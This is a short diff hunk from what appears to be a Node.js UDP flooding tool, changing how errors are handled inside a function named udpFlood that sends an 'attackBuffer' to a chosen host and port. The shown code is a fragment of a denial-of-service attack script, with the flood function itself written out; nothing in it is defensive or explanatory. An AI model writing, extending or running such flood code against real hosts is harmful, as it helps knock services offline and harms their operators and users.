@@ -49,8 +49,8 @@ if (cluster.isPrimary) {
     
     function udpFlood(host, port, length) {
         sock.send(attackBuffer, 0, length, port, host, (err) => {
-            if (err !== null) {
-                console.error(`Error encountered!: ${err}`);
+            if (err) {
+                throw err;
             }
         });
     }
